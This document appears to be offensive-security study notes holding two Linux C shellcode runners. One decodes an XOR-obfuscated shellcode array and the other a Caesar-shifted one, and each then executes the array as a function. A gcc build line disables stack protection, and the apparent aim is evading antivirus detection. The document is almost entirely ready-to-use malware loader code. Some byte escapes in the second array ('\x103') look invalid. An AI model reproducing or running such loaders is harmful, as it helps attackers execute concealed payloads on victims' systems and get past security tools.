# XOR

```c#
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
// Our obfuscated shellcode
unsigned char buf[] =
"\x02\x7B\xB5\x20\x43\x12\xD3\xFC\x5A\x02\xC3\x9C\x07\x7B\x83\x20\x68\x0B\x10\xF8\x4D\x45\x4F\x02\xCF\x8A\x32\x1B\x20\x40\x0B\x13\x1A\x20\x63\x12\xD3\x20\x48\x15\x20\x4B\x14\x45\x4F\x02\xCF\x8A\x32\x71\x02\xDD\x02\xF3\x48\x4A\x4B\xF1\x8A\xE2\x7B\x74\x1B\x02\xC3\xAC\x20\x5A\x10\x20\x60\x12\x45\x4F\x13\x02\xCF\x8A\x33\x6F\x03\xB5\x83\x3E\x52\x1D\x20\x69\x12\x20\x4A\x20\x4F\x02\xC3\xAD\x02\x7B\xBC\x45\x4F\x13\x13\x15\x02\xCF\x8A\x33\x8D\x20\x76\x12\x20\x4B\x15\x45\x4F\x14\x20\x34\x10\x45\x4F\x02\xCF\x8A\x32\xA7\xB5\xAC\x4A";
int main (int argc, char **argv)
{
	char xor_key = 'J';
	int arraysize = (int) sizeof(buf);
	for (int i=0; i<arraysize-1; i++)
	{
		buf[i] = buf[i]^xor_key;
	}
	int (*ret)() = (int(*)())buf;
	ret();
}

```

Check for encoder here:
[[C_ShellCodeRunner_Linux_ENCODER]]

Used in this chapter:
[[Evasion Techniques and Breaching Defenses#10 2 2 Antiscan me]]

# CAESARS
```c#
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
// Our obfuscated shellcode
unsigned char buf[] =
"\x4C\x35\x103\x6E\x0D\x5C\x9D\xBA\x14\x4C\x8D\xDA\x51\x35\xCD\x6E\x26\x45\x5E\xB6\x0B\x13\x09\x4C\x89\xC4\x7C\x55"
"\x6E\x0E\x45\x5D\x54\x6E\x2D\x5C\x9D\x6E\x06\x63\x6E\x05\x62\x13\x09\x4C\x89\xC4\x7C\x3F\x4C\x9B\x4C\xBD\x06\x04"
"\x05\xBF\xC4\xAC\x35\x42\x55\x4C\x8D\xEA\x6E\x14\x5E\x6E\x2E\x5C\x13\x09\x5D\x4C\x89\xC4\x7D\x29\x4D\x103\xCD\x78"
"\x1C\x5B\x6E\x27\x5C\x6E\x04\x6E\x09\x4C\x8D\xEB\x4C\x35\xFA\x13\x09\x5D\x5D\x63\x4C\x89\xC4\x7D\xCB\x6E\x40\x5C"
"\x6E\x05\x63\x13\x09\x62\x6E\x82\x5E\x13\x09\x4C\x89\xC4\x7C\xF1\x103\xEA\x04";
int main (int argc, char **argv)
{
        int caesar_key = 4;
        int arraysize = (int) sizeof(buf);
        for (int i=0; i<arraysize-1; i++)
        {
                buf[i] = buf[i] - caesar_key;
        }
        int (*ret)() = (int(*)())buf;
        ret();
}

```

Build with
```sh
gcc -o msf_caesar.out msf_caesar.c -z execstack
```
